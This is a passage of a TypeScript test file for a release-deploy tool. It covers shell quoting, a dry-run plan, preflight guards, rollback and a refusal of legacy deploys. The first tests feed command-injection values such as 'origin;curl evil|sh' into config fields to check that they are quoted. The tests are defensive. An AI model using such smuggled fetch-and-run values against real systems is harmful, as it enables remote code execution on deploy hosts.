    expect(joined).toContain(`rev-parse refs/heads/'master'\\''; curl evil|sh #'`);
  });

  it('quotes config.remote in the bare-mirror fetch, even with shell metacharacters', () => {
    const rt = makeReleaseRuntime();
    const calls: string[] = [];
    const runtime = {
      execFileSync: (f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        return (rt.runtime.execFileSync as any)(f, args);
      },
    };
    release.deployRelease(relConfig({ remote: 'origin;curl evil|sh' }), {}, ctx(runtime));
    const joined = calls.join('\n');
    expect(joined).toContain(`fetch --prune 'origin;curl evil|sh' '+refs/heads/*:refs/heads/*'`);
    expect(joined).not.toContain('fetch --prune origin;curl evil|sh ');
  });
});

describe('release deploy — complete deterministic --dry-run plan (CAIRN-369)', () => {
  it('walks every phase with symbolic captured values and no real-exec seam', () => {
    const config = relConfig({
      postDeployChecks: [{ name: 'public-smoke', command: 'run-public-smoke', onFailure: 'rollback' }],
      deliveryEvent: { command: 'emit-delivery-event' },
    });
    const plan = cli.dryRunContext(config);
    expect(plan.runtime.realExecFileSync).toBe(plan.runtime.execFileSync);

    const result = release.deployRelease(config, {}, plan);
    expect(result.steps).toEqual([
      'materialize', 'shared', 'install', 'verify-pins', 'build', 'validate',
      'backup', 'migrate', 'flip', 'health', 'post-check:public-smoke',
      'delivery-event', 'prune',
    ]);
    expect(result.sha).toBe('d'.repeat(40));
    expect(result.release).toBe('dddddddddddd-20990101T000000Z');
  });
});

describe('release deploy — preflight guards (each must fail by name)', () => {
  it('refuses a host with no layout marker', () => {
    const { runtime } = makeReleaseRuntime({ marker: '' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/requires a migrated host/);
  });
  it('refuses a marker with the wrong layout version', () => {
    const { runtime } = makeReleaseRuntime({ marker: '{"layout":"releases","version":99}' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/marker mismatch/);
  });
  it('refuses a target without GNU coreutils mv', () => {
    const { runtime } = makeReleaseRuntime({ mvVersion: 'mv (BusyBox v1.36)' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/GNU coreutils/);
  });
  it('refuses when free disk is below the threshold', () => {
    const { runtime } = makeReleaseRuntime({ dfAvail: '1024' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/Insufficient free disk/);
  });
  it('refuses release deploy without a stable ecosystemFile', () => {
    const { runtime } = makeReleaseRuntime();
    expect(() => release.deployRelease(relConfig({ ecosystemFile: null }), {}, ctx(runtime))).toThrow(/requires .ecosystemFile/);
  });
  it('refuses when the resolved SHA and the built SHA differ', () => {
    const { runtime } = makeReleaseRuntime({ builtSha: 'ffffffffffffffffffffffffffffffffffffffff' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/Candidate SHA/);
  });
  it('refuses a sharedPath that is tracked in the release', () => {
    const { runtime } = makeReleaseRuntime({ tracked: 'TRACKED' });
    expect(() => release.deployRelease(relConfig(), {}, ctx(runtime))).toThrow(/would hide a committed file/);
  });
});

describe('release rollback', () => {
  it('flips current back to the previous release with no reinstall/rebuild', () => {
    const { runtime, calls } = makeReleaseRuntime();
    const result = release.rollbackRelease(relConfig(), {}, ctx(runtime));
    expect(result.release).toBe('releases/00000000bbbb-20260708T090000Z');
    expect(calls.some((cmd) => /mv -Tf .*\/current/.test(cmd))).toBe(true);
    expect(calls.some((cmd) => cmd.includes('npm ci'))).toBe(false);
    expect(calls.some((cmd) => cmd.includes('npm run build'))).toBe(false);
  });
  it('refuses to roll back when no previous release is recorded', () => {
    const { runtime } = makeReleaseRuntime({ previousLink: '' });
    expect(() => release.rollbackRelease(relConfig(), {}, ctx(runtime))).toThrow(/No previous release/);
  });
});

describe('legacy path refuses a release-layout host', () => {
  it('aborts a legacy deploy when .deploy-kit-layout is present', () => {
    const calls: string[] = [];
    const runtime = {
      execFileSync: (_f: string, args: string[]) => {
        const cmd = args[args.length - 1];
        calls.push(cmd);
        if (cmd.includes('.deploy-kit-layout')) return 'RELEASE';
        if (cmd.includes('curl')) return '200';
        return '';
      },
    };
    const legacy = mergeConfig(DEFAULT_CONFIG, {
      host: 'app@pi', projectDir: '/srv/app', appNames: ['app'], dbBoundApps: ['app'], branch: 'master',
      hooks: { install: 'npm ci', migrate: 'run-migrate', build: 'npm run build' },
      autoCut: false,
    });
    expect(() => kit.deploy(legacy, {}, ctx(runtime))).toThrow(/Refusing to run a legacy in-place deploy/);
    expect(calls.some((cmd) => cmd.includes('git pull'))).toBe(false);
  });
});
